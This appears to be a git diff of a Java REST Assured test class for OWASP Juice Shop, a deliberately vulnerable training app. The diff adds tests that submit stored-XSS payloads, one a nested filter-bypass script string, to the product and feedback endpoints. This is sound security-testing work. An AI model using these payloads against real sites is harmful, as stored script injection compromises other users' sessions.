@@ -1,31 +1,28 @@
 import io.restassured.RestAssured;
 import io.restassured.http.ContentType;
-import io.restassured.response.Response;
 import org.hamcrest.Matchers;
 import org.junit.Before;
-import org.junit.Ignore;
-//import org.junit.jupiter.api.DisplayName;
-//import org.junit.jupiter.api.Test;
 import org.junit.Test;
 
 import java.io.IOException;
 import java.io.InputStream;
-import java.util.Map;
 import java.util.Properties;
 
 import static io.restassured.RestAssured.given;
-import static io.restassured.RestAssured.when;
-import static io.restassured.authentication.FormAuthConfig.springSecurity;
 import static io.restassured.module.jsv.JsonSchemaValidator.matchesJsonSchemaInClasspath;
 import static org.hamcrest.Matchers.equalTo;
 
-//@DisplayName("Testing OWASP JuiceShop")
+//import org.junit.jupiter.api.DisplayName;
+//import org.junit.jupiter.api.Test;
+
+//@DisplayName("Testing OWASP JuiceShop v.2.18.0")
 public class JuiceShop {
 
     private String email;
     private String password;
 
     @Before
+    //NOTE: Load Properties (set URL, Port, Proxy, Admin-Login)
     public void initTarget() throws IOException {
 
         Properties properties = new Properties();
@@ -36,22 +33,23 @@ public class JuiceShop {
             properties.load(stream);
         }
 
+        // Load config
         RestAssured.baseURI = properties.getProperty("base-uri");
         RestAssured.port = Integer.parseInt(properties.getProperty("port"));
         RestAssured.basePath = properties.getProperty("base-path");
-        RestAssured.proxy("127.0.0.1",8080); //Comment out, if you don't use a proxy
+
+        if (!properties.getProperty("proxy_ip").equals("")) {
+            RestAssured.proxy(properties.getProperty("proxy_ip"), Integer.parseInt(properties.getProperty("proxy_port")));
+        }
 
         this.email = properties.getProperty("username");
         this.password = properties.getProperty("password");
-
-        this.password = new String(password.getBytes("ISO-8859-1"),"UTF-8");
-
     }
 
     @Test
     //@DisplayName("Is specified juice-shop online?")
     //TODO: write better GET test to see if target is reachable. if not, then break and end all other tests
-    public void targetOnline() {
+    public void _targetOnline() {
         RestAssured.given().
                 when().
                 get("/product/search").
@@ -61,7 +59,7 @@ public class JuiceShop {
 
     @Test
     //@DisplayName("performing simple search with expected result")
-    public void simpleSearchMatchesExpectedResult() {
+    public void _simpleSearchMatchesExpectedResult() {
         RestAssured.given().
                 param("q","orange").
                 when().
@@ -74,7 +72,7 @@ public class JuiceShop {
 
     @Test
     //@DisplayName("matching response to defined JSON schema")
-    public void responseMatchesJSONProductSchema() {
+    public void _responseMatchesJSONProductSchema() {
         RestAssured.given().
                 param("q","orange").
                 when().
@@ -96,49 +94,56 @@ public class JuiceShop {
                 statusCode(200);
     }
 
-    @Ignore("juice-shop doesn't authenticate via HTTP header.")
     @Test
-    //TODO: Move to different file.
-    //@DisplayName("authenticating: basic, base64, HTTP header")
-    public void authBasicBase64HTTPHeader() {
-        RestAssured.given().
-                auth().preemptive().basic(email,password).
-                when().
-                post("/user/login").
-                then().
-                statusCode(200);
-    }
+    //NOTE: Checks only if payload can be stored, not if it's executed.
+    public void XSS_Stored_Payload_Accepted_Tier3() {
 
-    @Ignore("Not implemented yet.")
-    @Test
-    //@DisplayName("getting cookies")
-    public void showCookies() {
-        Response response = when().get("/user/login");
-        // Get all cookies as simple name-value pairs
-        Map<String, String> allCookies = response.getCookies();
-        // Get a single cookie value:
-        //String cookieValue = response.getCookie("cookieName");
-    }
+        String payloadXXS3 = "{" +
+                "\"id\": 1," +
+                "\"name\":" +
+                "\"Apple Juice (1000ml)\"," +
+                "\"description\": \"Some text<script>alert(\\\"XSS3\\\")</script>\"," +
+                "\"price\": 1.99," +
+                "\"image\": \"apple_juice.jpg\"," +
+                "\"createdAt\": \"2016-11-23 11:02:05.000 +00:00\"," +
+                "\"updatedAt\": \"2016-11-23 11:02:05.000 +00:00\"," +
+                "\"deletedAt\": null" +
+                "}";
 
-    @Ignore("Not implemented yet.")
-    @Test
-    //@DisplayName("looking for CSRF protection cookie")
-    public void csrfProtectionTokenReturned() {
-        /*
-        given().
-                auth().form("John", "Doe", formAuthConfig().withAutoDetectionOfCsrf()).
-        when().
-                get("/formAuth").
-        then().
-                statusCode(200);
-        */
+        // Clearing basePath = /rest
+        RestAssured.basePath = "";
 
         given().
-                auth().form("John", "Doe", springSecurity().withCsrfFieldName("_csrf")).
+                request().
+                    body(payloadXXS3).
+                    contentType(ContentType.JSON).
                 when().
-                get("/formAuth").
+                    patch("/api/Products/1").
+                then().
+                    statusCode(200);
+                // XXS Payload was accepted by the server.
+    }
+
+    @Test
+    //NOTE: Checks only if payload can be stored, not if it's executed.
+    public void XSS_Stored_Nested_Payload_Accepted_Tier4() {
+
+        String payloadXXS4 = "{\"comment\":\"<<script>alert(\\\"XSS4\\\")</script>script>alert(\\\"XSS4\\\")<</script>/script>\",\"rating\":0}";
+
+        // Clearing basePath = /rest
+        RestAssured.basePath = "";
+
+        given().
+                request().
+                body(payloadXXS4).
+                contentType(ContentType.JSON).
+                when().
+                post("/api/Feedbacks/").
                 then().
                 statusCode(200);
+        // XXS Payload was accepted by the server.
 
+        // <<script>alert("XSS4")</script>script>alert("XSS4")<</script>/script>
     }
+
 }
